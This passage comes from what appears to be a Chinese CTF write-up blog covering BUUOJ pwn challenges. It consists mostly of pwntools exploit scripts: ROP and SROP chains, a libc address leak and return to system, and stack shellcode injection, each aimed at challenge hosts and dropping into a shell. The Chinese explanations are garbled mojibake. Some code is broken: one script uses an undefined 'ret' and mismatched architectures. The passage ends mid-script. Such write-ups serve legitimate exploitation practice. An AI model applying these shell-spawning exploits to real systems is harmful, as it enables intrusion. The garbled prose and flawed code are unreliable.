ˆï¼Œç„¶åè·³è½¬åˆ°å‡½æ•°åœ°å€å¼€å§‹æ‰§è¡Œã€‚è¿™é‡Œé€‰æ‹©äº†ç›´æ¥ä¼ äº†ä¸€ä¸ª<code>ret</code>ï¼Œå¯ä»¥è®©æ ˆä¸Šç»“æ„ä¸å˜ï¼Œç„¶åæ¥ç€ROPåé¢çš„è¿‡ç¨‹ã€‚</li><li>éœ€è¦å‘æ ˆå†…æ‰‹åŠ¨å†™å…¥<code>/bin/sh</code>ï¼Œå¹¶ä¸”é€šè¿‡æ³„éœ²æ ˆçš„åœ°å€æ¥è®¡ç®—<code>/bin/sh</code>çš„åœ°å€è¾¾åˆ°ç›®çš„ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:25639&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc_start_main = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><br><span class="hljs-comment"># dbg(&#x27;b vuln&#x27;)</span><br><br>pop_addr = <span class="hljs-number">0x40059A</span><br>arg_set = <span class="hljs-number">0x400580</span><br>sys_call = <span class="hljs-number">0x400517</span><br>execve = <span class="hljs-number">0x4004E2</span><br>vuln = <span class="hljs-number">0x4004ED</span><br>ret = <span class="hljs-number">0x4003a9</span><br>pop_rdi = <span class="hljs-number">0x4005a3</span><br><span class="hljs-comment"># write /bin/sh into stack</span><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(ret) + (<span class="hljs-number">0x10</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) - <span class="hljs-number">0x8</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(vuln)<br><br><span class="hljs-comment"># get the address of &#x27;/bin/sh&#x27;</span><br>sl(payload)<br><br>rv(<span class="hljs-number">0x20</span>)<br>old_ebp = u64(rv(<span class="hljs-number">6</span>).strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;old_ebp: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(old_ebp)&#125;</span>&quot;</span>)<br>buf =  <span class="hljs-number">0x7ffc783316d0</span><br>ebp = <span class="hljs-number">0x7ffc7833321b</span><br>bin_sh = old_ebp + buf - ebp<br>bin_sh = old_ebp - <span class="hljs-number">0x118</span><br>ret_addr = bin_sh + <span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;bin_sh: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0) pop_rdi_esi_rdx ret</span><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(ret) + (<span class="hljs-number">0x10</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) - <span class="hljs-number">0x8</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(execve) + p64(pop_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(ret_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(bin_sh) + p64(arg_set) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(pop_rdi) + p64(bin_sh) + p64(sys_call)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>è§£æ³•2ï¼š</p><p>åœ¨ç½‘ä¸Šçœ‹åˆ°ä¸€äº› Sigreturn Oriented Programmingæ”»å‡» çš„æ–¹å¼è§£æœ¬é¢˜ã€‚å°†[[|SROP]]çš„ç›¸å…³å†…å®¹åœ¨<a href="https://www.anquanke.com/post/id/85810">è¿™ç¯‡æ–‡ç« </a>äº†</p><p>ç”¨è¿™æ ·çš„æ–¹æ³•å¯ä»¥ç›´æ¥è®¾ç½®å¯„å­˜å™¨çš„å€¼ä»è€Œè°ƒç”¨ä»»æ„çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>Local = <span class="hljs-literal">True</span> <br><span class="hljs-comment"># Local = False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:25639&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc_start_main = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><span class="hljs-comment"># dbg(&#x27;b vuln&#x27;)</span><br>sys_call = <span class="hljs-number">0x400501</span> <br>syscall = <span class="hljs-number">0x4004D6</span><br>vuln = <span class="hljs-number">0x4004ED</span><br><span class="hljs-comment"># write /bin/sh into stack</span><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(ret) + (<span class="hljs-number">0x10</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) - <span class="hljs-number">0x8</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(vuln)<br><br><span class="hljs-comment"># get the address of &#x27;/bin/sh&#x27;</span><br>sl(payload)<br><br>rv(<span class="hljs-number">0x20</span>)<br>old_ebp = u64(rv(<span class="hljs-number">6</span>).strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;old_ebp: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(old_ebp)&#125;</span>&quot;</span>)<br>buf =  <span class="hljs-number">0x7ffc783316d0</span><br>ebp = <span class="hljs-number">0x7ffc7833321b</span><br>bin_sh = old_ebp + buf - ebp<br>bin_sh = old_ebp - <span class="hljs-number">0x118</span><br>ret_addr = bin_sh + <span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;bin_sh: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)<br><br>signframe = SigreturnFrame(kernel=<span class="hljs-string">&#x27;i386&#x27;</span>)<br>signframe.rax = constants.SYS_execve<br>signframe.rdi = bin_sh<br>signframe.rsi = <span class="hljs-number">0</span><br>signframe.rdx = <span class="hljs-number">0</span><br>signframe.rip = sys_call<br><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(ret) + (<span class="hljs-number">0x10</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) - <span class="hljs-number">0x8</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x4004DA</span>) + p64(sys_call) + <span class="hljs-built_in">bytes</span>(signframe)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h1><p><img src="/images/20250828114214.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:29864&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># b *chall+212</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>awelcoms = <span class="hljs-number">0x08048845</span><br>chall = <span class="hljs-number">0x08048603</span><br>main = <span class="hljs-number">0x080486E2</span><br><br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>s_addr = rl().strip()[-<span class="hljs-number">10</span>:]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;s_addr: <span class="hljs-subst">&#123;s_addr&#125;</span>&quot;</span>)<br>s_addr = <span class="hljs-built_in">int</span>(s_addr, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;s_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(s_addr)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#-----leak address of libc-----#</span><br>payload = <span class="hljs-string">b&#x27;crashme\x00&#x27;</span> + (<span class="hljs-number">0x1a</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;crashme\x00&#x27;</span>)) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(printf_plt) + p32(main) + p32(awelcoms) + p32(printf_got)<br>sl(payload)<br>rl()<br>rl()<br>rl()<br>ru(<span class="hljs-string">b&#x27;Welcome &#x27;</span>)<br>printf = u32(rv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;printf: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf)&#125;</span>&quot;</span>)<br>obj = LibcSearcher(<span class="hljs-string">&#x27;printf&#x27;</span>, printf)<br>libc = printf - obj.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>system = libc + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>ru(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;crashme\x00&#x27;</span> + (<span class="hljs-number">0x1a</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;crashme\x00&#x27;</span>)) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + p32(chall) + p32(bin_sh)<br>sl(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ç”±äºæ²¡å¼€å¯æ ˆå¯æ‰§è¡Œä¿æŠ¤ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥å‘æ ˆå†…å†™å…¥<code>shellcode</code>æ¥ç›´æ¥æ‰“çš„ã€‚ä½†æˆ‘æ„Ÿè§‰æ³„éœ²libcåˆ¶é€ ROPä¹Ÿè¡Œï¼Œç„¶åç¡®å®ä¹Ÿæ‰“é€šäº†ï¼ˆï¼ˆï¼ˆ<br>æœ¬é¢˜ç›®çš„æœ¬æ„è‚¯å®šæ˜¯å†™<code>shellcode</code>çš„ï¼Œå› ä¸ºç¬¬ä¸€å¥å°±æŠŠsçš„åœ°å€ç»™å‡ºæ¥äº†ï¼ˆï¼‰ä¸è¿‡æˆ‘æ²¡ç®¡ï¼Œæ„Ÿè§‰è¿˜è¦è®¡ç®—åç§»å¥½éº»çƒ¦ã€‚ä½†æ˜¯è¿˜æ˜¯è¯•ä¸€ä¸‹å§ï¼Œæ¯•ç«Ÿè‡ªå·±å¯¹å†™<code>shellcode</code>çš„é¢˜ç›®ä¹Ÿä¸æ˜¯å¾ˆç†Ÿï¼Œå°±å½“ç»ƒä¹ äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:29860&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># b *0x08048600</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>awelcoms = <span class="hljs-number">0x08048845</span><br>chall = <span class="hljs-number">0x08048603</span><br>main = <span class="hljs-number">0x080486E2</span><br>shellcode=asm(shellcraft.sh())<br><br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>s_addr = rl().strip()[-<span class="hljs-number">10</span>:]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;s_addr: <span class="hljs-subst">&#123;s_addr&#125;</span>&quot;</span>)<br>s_addr = <span class="hljs-built_in">int</span>(s_addr, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;s_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(s_addr)&#125;</span>&quot;</span>)<br>shellcode_addr = s_addr - <span class="hljs-number">0x1c</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;shellcode_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(shellcode_addr)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;crashme\x00&#x27;</span>))<br><span class="hljs-comment">#-----leak address of libc-----#</span><br>payload = <span class="hljs-string">b&#x27;crashme\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x16</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;crashme\x00&#x27;</span>) + <span class="hljs-number">0x4</span>) + p32(shellcode_addr) + shellcode<br><span class="hljs-comment"># payload = b&#x27;crashme\x00&#x27; + (0x1a - len(b&#x27;crashme\x00&#x27;)) * b&#x27;a&#x27; + p64(shellcode_addr) + shellcode</span><br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h1><p><img src="/images/20250828150010.png"><br>ç¬¬ä¸€æ¬¡è§åˆ°å¼€å¯äº†<code>PIE</code>ä¿æŠ¤çš„é¢˜ç›®ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜æ²¡åŠæ³•åç¼–è¯‘ï¼Œç›´æ¥çœ‹æ±‡ç¼–ï¼Œå°±æ˜¯è¯»ä¸€æ®µå­—ç¬¦ï¼Œä¼ åˆ°<code>buf</code>é‡Œé¢ï¼Œç„¶åç›´æ¥<code>call [rbp + buf]</code>ï¼Œé‰´å®šä¸ºè„‘æ®‹é¢˜ï¼Œå†™ä¸€æ®µ<code>shellcode</code>è¿›å»å°±è¡Œäº†ï¼Œæˆ‘è¿˜ä»¥ä¸ºè¦çˆ†ä¸€ä¸‹<code>libc</code>ï¼Œæ¿€åŠ¨åäº†ç¬¬ä¸€æ¬¡åœ¨<code>buu</code>ä¸Šçœ‹åˆ°ç±»ä¼¼çš„é¢˜ç›®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26158&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span 